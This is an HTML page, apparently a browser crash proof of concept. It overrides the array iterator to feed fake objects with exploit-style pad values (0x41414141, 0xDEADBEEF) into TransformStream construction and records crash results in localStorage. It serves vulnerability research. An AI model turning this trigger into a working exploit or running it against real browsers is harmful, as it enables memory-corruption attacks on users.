<!DOCTYPE html>
<html>
<body>
<div id="status">Running...</div>
<script>
localStorage.removeItem('crash_test1');
localStorage.removeItem('crash_test2');

function testCrash(padValue, testName) {
    try {
        Array.prototype[Symbol.iterator] = function() {
            const arr = this;
            let i = 0;
            return {
                next() {
                    if (i >= arr.length)
                        return { done: true };
                    let val = arr[i];
                    if (arr.length === 3 && i >= 1) {
                        localStorage.setItem(testName, 'CRASH_AT_INDEX_' + i + '_PAD_0x' + padValue.toString(16));
                        val = { fake: true, pad: padValue };
                    }
                    i++;
                    return { value: val, done: false };
                }
            };
        };
        new TransformStream();
        localStorage.setItem(testName, 'NO_CRASH');
    } catch(e) {
        localStorage.setItem(testName, 'CAUGHT: ' + e.message);
    }
    Array.prototype[Symbol.iterator] = [][Symbol.iterator];
}

// اختبار 1: pad = 0x41414141
testCrash(0x41414141, 'crash_test1');

// اختبار 2: pad = 0xDEADBEEF
testCrash(0xDEADBEEF, 'crash_test2');

document.getElementById("status").textContent = "Done. Check localStorage.";
</script>
</body>
</html>
